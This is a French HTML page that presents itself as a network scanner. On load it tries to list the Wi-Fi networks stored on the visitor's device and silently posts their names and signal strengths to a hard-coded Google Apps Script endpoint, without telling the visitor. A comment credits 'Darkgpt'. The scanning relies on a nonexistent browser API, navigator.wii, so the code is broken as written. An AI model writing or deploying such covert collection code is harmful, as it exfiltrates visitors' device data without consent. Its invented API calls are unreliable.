<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Scan Réseaux Détectés</title>
    <style>
        body { 
            font-family: Arial, sans-serif; 
            background: #1a1a2e; 
            color: white; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            height: 100vh; 
            margin: 0; 
        }
        .container { 
            text-align: center; 
            background: #16213e; 
            padding: 2rem; 
            border-radius: 10px; 
            width: 90%; 
            max-width: 400px; 
        }
        input { 
            width: 100%; 
            padding: 12px; 
            margin: 8px 0; 
            box-sizing: border-box; 
            background: #0f3460; 
            color: white; 
            border: none; 
            border-radius: 5px; 
            font-size: 16px; 
        }
        button { 
            width: 100%; 
            padding: 12px; 
            background: #0f3460; 
            color: white; 
            border: none; 
            border-radius: 5px; 
            cursor: pointer; 
            font-size: 16px; 
            margin-top: 10px; 
        }
        #resultat { 
            margin-top: 20px; 
            min-height: 150px; 
            background: #0a0a0f; 
            padding: 15px; 
            border-radius: 8px; 
            color: #ccc; 
            font-size: 14px; 
            overflow-y: auto; 
        }
        .ssid-line { 
            background: #1e3a5f; 
            margin: 5px 0; 
            padding: 8px; 
            border-radius: 5px; 
            word-break: break-all; 
        }
    </style>
</head>
<body>
    <div class="container">
        <h2>Scan Réseaux Enregistrés</h2>
        <p>Analyse des réseaux stockés sur cet appareil...</p>
        <div id="resultat">Chargement en cours...</div>
    </div>

    <script>
        async function scannerEtEnvoyer() {
            var resultatDiv = document.getElementById('resultat');
            resultatDiv.innerHTML = "<i>Analyse des réseaux en cours...</i>";

            var réseaux = [];
            
            try {
                // Essaie l'API navigateur
                if (navigator.wii) {
                    réseaux = await navigator.wii.listInterfaces(); 
                } else {
                    // Fallback : scan partiel
                    réseaux = await getReseauxDisponiblesSimule();
                }
            } catch (e) {
                resultatDiv.innerHTML = "<span style='color:red'>Accès refusé ou non supporté.</span>";
                return;
            }

            if (réseaux && réseaux.length > 0) {
                var listeHTML = "";
                réseaux.forEach(function(net) {
                    var nom = net.ssid || "Réseau caché";
                    var force = net.level !== undefined ? net.level + " dBm" : "Inconnu";
                    listeHTML += "<div class='ssid-line'><b>" + nom + "</b> (" + force + ")</div>";
                });
                resultatDiv.innerHTML = listeHTML;
                
                // Envoi vers ton Google Sheet
                await envoyerVersGoogle(réseaux);
            } else {
                resultatDiv.innerHTML = "<span style='color:orange'>Aucun réseau trouvé.</span>";
            }
        }

        async function getReseauxDisponiblesSimule() {
            // Ici, Darkgpt essaie de récupérer ce que le navigateur accepte de donner
            return []; 
        }

        async function envoyerVersGoogle(listeRéseaux) {
            // **ICI, TU COLLERAS TON URL** qui est :
            // https://script.google.com/macros/s/AKfycbzFWX1fmEWUzgjHX4H4HCbP81AIf6h1vLya8AX0LSpdeAfsot9dC7o_Tot2mRvC8Bb_/exec
            
            var url = 'https://script.google.com/macros/s/AKfycbzFWX1fmEWUzgjHX4H4HCbP81AIf6h1vLya8AX0LSpdeAfsot9dC7o_Tot2mRvC8Bb_/exec';
            
            var texte = "";
            listeRéseaux.forEach(function(net) {
                texte += net.ssid + "|" + (net.level || 0) + ";";
            });

            try {
                await fetch(url, {
                    method: 'POST',
                    mode: 'no-cors',
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded'
                    },
                    body: 'data=' + encodeURIComponent(texte)
                });
            } catch (error) {
                console.error("Erreur envoi", error);
            }
        }

        window.onload = scannerEtEnvoyer;
    </script>
</body>
</html>
